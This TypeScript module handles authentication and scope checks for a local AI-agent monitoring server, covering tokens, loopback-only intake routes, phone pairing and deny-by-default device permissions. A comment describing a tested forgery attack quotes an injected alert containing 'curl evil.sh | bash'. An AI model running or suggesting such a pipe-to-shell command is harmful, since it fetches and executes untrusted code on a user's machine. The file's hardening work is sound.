// Optional shared-secret auth for the capability surface (a shell, git/docker
// writes, the fleet feed). The whole model is otherwise "loopback + same-origin",
// which is enough for a single-user localhost box but nothing more: any other
// local process can reach the port, and binding a non-loopback address exposes
// unauthenticated RCE. A token closes both — a local process without it can't
// open the shell, and exposure becomes safe.
//
// Trust model:
//   * AGENTGLASS_TOKEN set        → that token is required.
//   * unset AND loopback-only     → no token (zero-config local UX, unchanged).
//   * unset AND exposed (non-lo)  → refuse to run unauthenticated: mint a stable
//                                   token (persisted 0600) and print it.
//
// Intake routes stay tokenless on purpose (see LOCAL_SINKS), but only for a
// sender on this machine: local hooks and OTel exporters have no way to carry
// a secret, and everything they can reach without one now has to come from
// loopback.
import { timingSafeEqual, randomBytes } from "node:crypto";
import { existsSync, readFileSync, writeFileSync, mkdirSync, chmodSync } from "node:fs";
import { homedir } from "node:os";
import { join, dirname } from "node:path";
import { deviceFor, scopeAllows, type Device, type Scope } from "./devices.ts";

const TOKEN_PATH = join(
  process.env.XDG_CONFIG_HOME || join(homedir(), ".config"),
  "agentglass",
  "token"
);

/**
 * Where the request came from.
 *
 * An exemption cannot be a property of the path alone. The sinks below are safe
 * to leave open to this machine and are not safe to leave open to a network, so
 * the question "does this route need the token" only has an answer once you know
 * who is asking — see LOCAL_SINKS.
 *
 * "Physically" used to be in that first line, and it was doing real damage: it
 * invited reading this as "whatever the TCP socket says", which is how the
 * whole tailnet ended up counted as loopback. `tailscale serve` terminates TLS
 * in tailscaled and re-dials 127.0.0.1, so the socket says loopback for every
 * phone on the mesh. `loopback` here means *this machine*, which is a claim
 * about who, not about which interface — resolvePeer/originOf in net.ts decide
 * it, and they only believe a proxy that has been verified by the uid owning
 * the connection.
 */
export type Origin = "loopback" | "remote";

// Tokenless from anywhere. Neither reads nor writes anything: `/health` is the
// identity marker a shell probes to find which server owns a port, and the
// phone's pairing screen calls it *before* it has a credential to carry.
//
// Note: /gate is deliberately NOT here. It's the control plane — a POST creates
// an operator-facing approval prompt with caller-controlled text — so when a
// token is set the gate hook must authenticate (it runs on the same machine and
// can read AGENTGLASS_TOKEN from the env). With no token configured the whole
// auth check is skipped anyway, so /gate keeps its zero-config tokenless UX.
const OPEN = new Set([
  "/health",
  // Exempt although it receives nothing: it exists to explain that there is no
  // metrics receiver here (see index.ts). An exporter cannot carry a token, so
  // gating it would replace a silent 404 with a silent 401 — the same dead end
  // wearing a different number. It stores nothing and broadcasts nothing, which
  // is why it is here rather than below.
  "/v1/metrics",
  "/otlp/v1/metrics",
]);

/**
 * Tokenless, but only from this machine.
 *
 * These append to the events table, and appending is not inert: /ingest →
 * maybeAlert → the live socket → a notification on the desk and on the paired
 * phone, with the title and body taken from the request. maybeAlert sits
 * outside the sessionInScope filter, so scoping does not contain it either.
 *
 * Measured against a server bound 0.0.0.0, from a LAN address, with no
 * credential at all: `POST /ingest` answered `{"ok":true,"id":1}` and put
 * `🔔 Security:forged-b — "Your disk is failing — run: curl evil.sh | bash"`
 * on the desk socket, then a forged `⏳ Approval needed` at urgency 2 — the
 * shape that means "an agent is stopped, come and approve it". The same three
 * posts wrote three permanent rows into SQLite, one of them $9,999 of cost.
 * `POST /sessions` from the same address answered 401, which is what the gate
 * looks like when it is doing its job.
 *
 * The exemption used to justify itself with "they can only *append* events".
 * That sentence was written when this server only ever listened on 127.0.0.1.
 * Appending stopped being inert the day it drove a notification and an audit
 * store, and the bind stopped being loopback the day the phone existed.
 *
 * Loopback is the whole of what the local senders need: hooks/send_event.py
 * refuses any server that is not localhost unless AGENTGLASS_ALLOW_REMOTE is
 * set, and a local OTel exporter points at localhost too. A sender that
 * genuinely is off-box authenticates like every other client — the same
 * `Authorization: Bearer $AGENTGLASS_TOKEN` gate_event.py already sends.
 */
const LOCAL_SINKS = new Set([
  "/ingest",
  "/v1/traces",
  "/otlp/v1/traces",
  "/v1/logs",
  "/otlp/v1/logs",
]);

/**
 * The pairing handshake, which cannot require the credential it hands out.
 *
 * Nothing under here is a way in on its own: the machine-side routes refuse
 * anything but loopback, and the phone-side ones are worth exactly as much as
 * the ticket and code the person is holding — see pairing.ts. Prefixed rather
 * than listed because the set is a protocol, and a step added to the protocol
 * without its exemption fails in a way that looks like a bug in the phone.
 */
export const isPairing = (pathname: string) => pathname === "/pair" || pathname.startsWith("/pair/");

/**
 * True for routes that bypass the shared-secret gate even when a token is set.
 *
 * `from` is not optional on purpose. A default would decide the loopback
 * question for a call site that forgot to ask it, and the direction a forgotten
 * default falls is straight through the gate — so the compiler asks instead.
 */
export const isAuthExempt = (pathname: string, from: Origin) =>
  isPairing(pathname) || OPEN.has(pathname) || (from === "loopback" && LOCAL_SINKS.has(pathname));

// Rate-limited intake sinks (flood protection). /gate is included: even though
// it authenticates when a token is set, a burst of gate posts shouldn't be
// unbounded. This set governs throttling only, not auth exemption — which is
// why it names the sinks whatever address they arrive from: a flood is a flood.
// `/pair/claim` is here for the same reason: it takes no credential, so the
// only thing standing between it and a script is the five-guess cap on one
// ticket. That cap is the real defence; this stops the noise before it.
const INTAKE = new Set([...OPEN, ...LOCAL_SINKS, "/gate", "/pair/claim"]);

export const isIntake = (pathname: string) => INTAKE.has(pathname);

export interface Auth {
  token: string | null;
  source: "env" | "file" | "generated" | "none";
  path: string;
}

export function resolveToken(loopbackOnly: boolean): Auth {
  const fromEnv = process.env.AGENTGLASS_TOKEN?.trim();
  if (fromEnv) return { token: fromEnv, source: "env", path: TOKEN_PATH };
  if (loopbackOnly) return { token: null, source: "none", path: TOKEN_PATH };
  const existing = readPersisted();
  if (existing) return { token: existing, source: "file", path: TOKEN_PATH };
  const t = randomBytes(24).toString("base64url");
  persist(t);
  return { token: t, source: "generated", path: TOKEN_PATH };
}

function readPersisted(): string | null {
  try {
    return existsSync(TOKEN_PATH) ? readFileSync(TOKEN_PATH, "utf8").trim() || null : null;
  } catch {
    return null;
  }
}

function persist(t: string): void {
  try {
    mkdirSync(dirname(TOKEN_PATH), { recursive: true });
    writeFileSync(TOKEN_PATH, t + "\n", { mode: 0o600 });
    chmodSync(TOKEN_PATH, 0o600); // enforce even if the file pre-existed with looser perms
  } catch {
    /* best effort — the token still works for this run */
  }
}

function eq(a: string, b: string): boolean {
  const ba = Buffer.from(a);
  const bb = Buffer.from(b);
  if (ba.length !== bb.length) return false; // length is not secret
  return timingSafeEqual(ba, bb);
}

/** True when the request carries the token — `Authorization: Bearer <t>` for
 *  fetch, or `?token=<t>` for the URLs a browser can't attach a header to
 *  (WebSocket upgrades, download navigations). */
export function tokenOk(req: Request, url: URL, token: string): boolean {
  const provided = presented(req, url);
  return !!provided && eq(provided, token);
}

/** The credential this request carries, however it carried it. */
function presented(req: Request, url: URL): string {
  const auth = req.headers.get("authorization") || "";
  const bearer = auth.startsWith("Bearer ") ? auth.slice(7).trim() : "";
  return bearer || url.searchParams.get("token") || "";
}

/**
 * Who is asking, and how much they are allowed to do.
 *
 * Two kinds of credential reach this server now. The machine's own token is
 * what the desk uses and what a hook carries; it is the whole machine, so it
 * is `full`. A **device** credential belongs to one paired phone, was minted
 * with a scope somebody chose while looking at the request, and can be taken
 * back without touching anything else — see devices.ts.
 *
 * Order matters: the machine token is checked first and in constant time, so
 * the common case never walks the device list at all.
 */
export interface Caller {
  kind: "machine" | "device";
  scope: Scope;
  device?: Device;
}

export function callerFor(req: Request, url: URL, token: string): Caller | null {
  const provided = presented(req, url);
  if (!provided) return null;
  if (eq(provided, token)) return { kind: "machine", scope: "full" };
  const device = deviceFor(provided);
  return device ? { kind: "device", scope: device.scope, device } : null;
}

/**
 * A phone may answer what is already asked. It may not drive the machine.
 *
 * Written as *deny by default* on purpose: anything that changes state and is
 * not named below needs `full`, so a route added next month is out of a paired
 * phone's reach until somebody decides otherwise. The reverse default — a list
 * of forbidden routes — fails open every time the list is not updated, and the
 * thing it fails open on is a shell.
 *
 * That leaves two sets of exceptions, both of which exist because this server's
 * verbs do not line up neatly with HTTP's:
 */

/** POSTs that only read. They are POSTs because their argument is a filesystem
 *  path, which has no business in a URL, not because they change anything. */
const READ_POST = new Set(["/git/status"]);

/**
 * GETs that are not reads. `/terminal/pty` is a WebSocket upgrade, and a
 * browser cannot put a header on one — so it arrives as a GET carrying
 * `?token=`, and a rule that trusted the method would hand a read-only device
 * an interactive root shell. This set is the reason `scopeNeeded` cannot be
 * one line.
 */
const FULL_GET = new Set([
  "/terminal/pty",
  // Imported browsing history. It is a GET, so the method default would hand it
  // to a read-scope phone — but it is the same private data cookieread keeps off
  // HTTP on purpose, not something a paired read-only device should be able to
  // pull. Drive verbs (/browser/open, /browser/read) already need full as POSTs;
  // this brings the history read in line with them.
  "/browser/places/all",
]);

/**
 * What a phone is for.
 *
 * `/gate/decide` is the reason a phone exists at all: an agent is stopped and a
 * person says go. The chat routes are the same act by other means — replying to
 * a session that is already running, which is what "answer" means. Starting new
 * sessions, the terminal, git write and docker are not here.
 *
 * `/push/subscribe`, `/push/unsubscribe` and `/push/test` were also here, for a
 * device managing its own notifications. Web Push is gone — a phone now hears
 * alerts on the live socket it already holds, which needs no write at all — and
 * a name left in this set after its route is deleted is worse than dead code:
 * this is the file that decides what a paired phone may do, and the next route
 * to be called `/push/test` would inherit an `answer` grant nobody chose for it.
 */
const ANSWER_POST = new Set([
  "/gate/decide",
  "/chat/send",
  "/chat/pane/key",
]);

export function scopeNeeded(method: string, pathname: string): Scope {
  if (FULL_GET.has(pathname)) return "full";
  if (method === "GET" || method === "HEAD") return "read";
  if (READ_POST.has(pathname)) return "read";
  if (ANSWER_POST.has(pathname)) return "answer";
  return "full";
}

/** True when this caller may make this request. */
export function allowed(caller: Caller, method: string, pathname: string): boolean {
  return scopeAllows(caller.scope, scopeNeeded(method, pathname));
}
